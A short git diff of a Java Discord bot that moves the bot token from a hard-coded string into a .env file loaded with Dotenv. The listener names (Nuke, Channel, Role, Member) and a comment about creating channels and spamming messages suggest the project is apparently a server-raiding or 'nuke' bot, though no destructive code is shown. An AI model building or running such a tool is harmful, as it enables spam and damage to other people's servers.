@@ -1,5 +1,6 @@
 package wtf.gun.maou;
 
+import io.github.cdimascio.dotenv.Dotenv;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Activity;
@@ -15,9 +16,14 @@ import org.jetbrains.annotations.NotNull;
 import java.util.concurrent.TimeUnit;
 
 public final class Bot {
+
+    private final Dotenv config;
+
     public Bot() throws InterruptedException {
+        config = Dotenv.configure().load();
+        String token = config.get("TOKEN");
         // Input bot token
-        JDA jda = JDABuilder.createDefault("TOKEN")
+        JDA jda = JDABuilder.createDefault(token)
                 // Set activity of bot
                 .setActivity(Activity.watching("VALORANT"))
                 .setChunkingFilter(ChunkingFilter.ALL)
@@ -28,6 +34,10 @@ public final class Bot {
                 .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create())
                 .build()
                 .awaitReady();
+    }
+
+    public Dotenv getConfig() {
+        return config;
     }
 
     // Create x channels and spam message x times in each channel
